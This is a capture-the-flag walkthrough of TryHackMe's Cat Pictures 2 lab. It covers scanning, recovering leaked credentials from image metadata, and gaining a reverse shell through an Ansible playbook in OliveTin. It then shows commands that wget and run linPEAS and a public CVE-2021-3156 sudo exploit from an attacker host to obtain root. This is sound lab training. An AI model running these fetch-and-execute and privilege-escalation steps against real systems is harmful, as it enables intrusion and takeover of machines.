---
title: "Meow! Enjoy Cat Pictures? If Not, Then You Will After Leveraging One to Obtain Root"
slug: cat-pictures-2
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This walkthrough covers the [Cat Pictures 2](https://tryhackme.com/room/catpictures2) CTF found on [TryHackMe](https://tryhackme.com/). The objective of this challenge is to identify a vulnerability in the web application and exploit it to gain an initial foothold. The ultimate goal is to perform a privilege escalation and obtain root access.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493087000/edb8127b-a214-47a3-9098-bb4d43ab0a56.png){: .center-image }

### Step 1: What's Out There?

We're going to kick off this CTF with an nmap scan.

```bash
nmap -A -T3 -p- <VICTIM_IP> -vvv
```

```plaintext
Nmap scan report for 10.10.74.64
Host is up, received reset ttl 61 (0.17s latency).
Scanned at 2023-07-06 06:02:31 MDT for 113s

PORT     STATE  SERVICE    REASON         VERSION
80/tcp   closed http       reset ttl 61
222/tcp  closed rsh-spx    reset ttl 61
1337/tcp open   waste?     syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 3858
|     Content-Type: text/html; charset=utf-8
|     Date: Thu, 06 Jul 2023 12:02:52 GMT
|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>OliveTin</title>
|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
|     </head>
|     <body>
|     <main title = "main content">
|     <fieldset id = "section-switcher" title = "Sections">
|     <button id = "showActions">Actions</button>
|_    <button id = "showLogs">Logs</but
3000/tcp closed ppp        reset ttl 61
8080/tcp closed http-proxy reset ttl 61
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94%I=7%D=7/6%Time=64A6AD5D%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nDate:\x20Thu,\x2006\x20Jul\x202023\x2012:02:52\x20GMT\r\
SF:nLast-Modified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n
SF:<!DOCTYPE\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<tit
SF:le>OliveTin</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x2
SF:0=\x20\"text/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20r
SF:el\x20=\x20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x
SF:20=\x20\"OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-
SF:touch-icon\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/
SF:>\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x
SF:20href=\"OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"ap
SF:ple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png
SF:\"\x20/>\n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20c
SF:ontent\">\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\
SF:x20=\x20\"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Ac
SF:tions</button>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but")%
SF:r(HTTPOptions,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\
SF:nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nDate:\x20Thu,\x2006\x20Jul\x202023\x2012:02:52\x20GMT\r\nLast-Modi
SF:fied:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n<!DOCTYPE\
SF:x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\"\x20conte
SF:nt=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<title>OliveTi
SF:n</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x20=\x20\"te
SF:xt/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20rel\x20=\x2
SF:0\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x20=\x20\"O
SF:liveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon
SF:\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/>\n\t\t<li
SF:nk\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x20href=\"O
SF:liveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"apple-touch-
SF:icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png\"\x20/>\n
SF:\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20content\">\
SF:n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\x20=\x20\"
SF:Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Actions</but
SF:ton>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/6%OT=1337%CT=80%CU=44556%PV=Y%DS=4%DC=T%G=Y%TM=64A6A
OS:DC8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509S
OS:T11NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)E
OS:CN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=3F%W=FE88%S=O%A=S+%F=AS%O=M509ST11NW7%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 14.428 days (since Wed Jun 21 19:48:42 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   45.89 ms  10.13.0.1
2   ... 3
4   166.41 ms 10.10.74.64
```

We discovered ports: 80, 222, 1337, 3000, and 8080. Let's focus on port 80 for now and work our way up from there.

### Step 2: Exiftool and Gitea

From an initial glance, it looks like we're dealing with a `Lychee` service that's being used to host cat pictures. After skimming through the photos, I noticed something peculiar.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493160703/a9c7b8da-c447-43ed-bb7d-f1a0ab5b1ef1.png){: .center-image }

The description reads, "*Note to self: strip metadata"*. This tells me that we're possibly looking at a picture containing metadata that could prove helpful. Let's run this through `exiftool`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493186606/ef7786f0-0620-4b7a-9b13-7320e628680d.jpeg){: .center-image }

We find our next stepping stone, Title: `:8080/********************************.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493195341/db5b0cbd-7053-49b5-a12a-a02cae74934d.jpeg){: .center-image }

This text file contains some critical information. We're looking at a developer leaving notes that should only be visible to themselves. In the note, they reveal a username and password, as well as hint at an internal test case that might create an opportunity for us to escalate privileges. Let's move over to the Gitea service running on port 3000 and see if we can log in with these credentials.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493204485/c3cc62ca-3bfa-44f8-bdcd-c9a9d1c2192c.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493209331/4e5396c0-25ac-4ac4-ac39-6a98317dad45.jpeg){: .center-image }

We find our first flag after signing in and navigating to the Ansible repository. From here we come across a `playbook.yaml` that contains a remote\_user `bismuth` and a sign that we can run commands.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493223346/da539d48-8130-49ff-a37c-272f69aebfd5.png){: .center-image }

### Step 3: Olive Tin

This application looks very promising. After playing around with it, I noticed the logs section and can see outputted results of a script running, which closely resembles the one we found in `playbook.yaml`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493236862/588aa79d-7255-49e3-8497-57effab878fb.webp){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493241319/6a874227-baf4-4b45-9fc7-9cacee4247c5.png){: .center-image }

Let's see what happens if we modify the script to include a reverse shell. Will it accept and display here? Let's pop a netcat listener just in case it works.

```bash
nc -lvnp 1337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493256582/5afae235-62d0-4455-bfd2-e4d9776bb73d.png){: .center-image }

### Step 4: Foothold

After clicking the *Run Ansible Playbook* button from the Olive Tin application and waiting a few seconds, we get a shell and our second flag!

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493275285/ebd55d3f-6e93-433e-87a7-3b1673057b8b.png){: .center-image }

From here we're going to begin our privilege escalation. We'll start by getting linPEAS on the box.

From the attack box (where `linPEAS` is saved):

```bash
python3 -m http.server 8000
```

From victim:

```bash
wget http://<ATTACKER_IP>:8000/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

### Step 5: Privesc and Root

Luckily for us, there's a GitHub repository we can use to exploit this.

From the attack box (where the exploit is saved):

```bash
git clone https://github.com/blasty/CVE-2021-3156
tar -cvf exploit.tar CVE-2021-3156
python3 -m http.server 8000
```

From victim:

```bash
wget http://10.13.28.215:8000/exploit.tar
tar xopf exploit.tar
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0
```

We have root and our last flag!

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493363765/e35c3ff3-b1dc-4f68-ad02-81ec9164223d.jpeg){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691493369043/8f1682e1-a506-47e3-bc5e-4cacb092f279.png){: .center-image }

I hope you enjoyed this walkthrough of [Cat Pictures 2](https://tryhackme.com/room/catpictures2) by [gamercat](https://tryhackme.com/p/gamercat). Happy hacking.